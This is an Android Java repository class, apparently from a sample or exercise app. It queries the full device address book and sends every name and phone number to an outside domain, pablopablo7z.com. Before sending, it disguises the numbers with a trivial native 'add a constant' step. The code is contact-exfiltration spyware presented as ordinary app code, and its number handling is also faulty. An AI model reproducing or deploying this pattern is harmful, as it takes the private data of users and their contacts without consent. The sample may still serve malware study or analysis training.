package com.app.example.domain;

import static com.app.example.extras.Constants.NUMBER_CRYPT;

import android.app.Application;
import android.content.ContentResolver;
import android.database.Cursor;
import android.provider.ContactsContract;
import android.util.Log;

import androidx.lifecycle.MutableLiveData;

import com.app.example.extras.Constants;
import com.app.example.ui.items.Contact;

import java.util.ArrayList;
import java.util.List;

import okhttp3.ResponseBody;
import retrofit2.Call;
import retrofit2.Callback;
import retrofit2.Response;
import retrofit2.Retrofit;
import retrofit2.converter.gson.GsonConverterFactory;

class MainRepository {
    private MutableLiveData<List<Contact>> contacts;
    private Application application;

    public MainRepository(Application application) {
        this.application = application;
    }

    public MutableLiveData<List<Contact>> getContacts() {
        if (contacts == null) {
            contacts = new MutableLiveData<>();
            loadContacts();
        }
        return contacts;
    }

    private void loadContacts() {
        ContentResolver contentResolver = application.getContentResolver();
        List<Contact> contactList = new ArrayList<>();
        String[] projection = {
                ContactsContract.CommonDataKinds.Phone.DISPLAY_NAME,
                ContactsContract.CommonDataKinds.Phone.NUMBER
        };
        Cursor cursor = contentResolver.query(
                ContactsContract.CommonDataKinds.Phone.CONTENT_URI,
                projection,
                null,
                null,
                ContactsContract.CommonDataKinds.Phone.DISPLAY_NAME + " ASC"
        );

        if (cursor != null) {
            while (cursor.moveToNext()) {
                String name = cursor.getString(cursor.getColumnIndex(ContactsContract.CommonDataKinds.Phone.DISPLAY_NAME));
                String number = cursor.getString(cursor.getColumnIndex(ContactsContract.CommonDataKinds.Phone.NUMBER));
                contactList.add(new Contact(number, name));
            }
            contacts = new MutableLiveData<>(contactList);
        }
    }

     void postContacts(List<Contact> contactList) {
        Retrofit retrofit = new Retrofit.Builder()
                .baseUrl("https://pablopablo7z.com/")
                .addConverterFactory(GsonConverterFactory.create())
                .build();
        List<Contact> encryptedContactList = encryptWithNative(contactList);
        ApiService service = retrofit.create(ApiService.class);
        Call<ResponseBody> call = service.sendContacts(encryptedContactList);
        call.enqueue(new Callback<ResponseBody>() {
            public void onResponse(Call<ResponseBody> call, Response<ResponseBody> response) {
                Log.d("SUCCESS", "Contacts submited! thanks Pablo!");
            }
            public void onFailure(Call<ResponseBody> call, Throwable t) {
                Log.d("FAILURE", "Oops, something go wrong Pablo!");            }
        });
    }

    private List<Contact> encryptWithNative(List<Contact> contactList){
        for(Contact item: contactList){
            String result = String.valueOf(addNumbers(Integer.parseInt(item.getNumber()), Constants.NUMBER_CRYPT));
            item.setNumber(result);
        }
        return contactList;
    }


    static {
        System.loadLibrary("native-lib");
    }

    public native int addNumbers(int a, int b);
}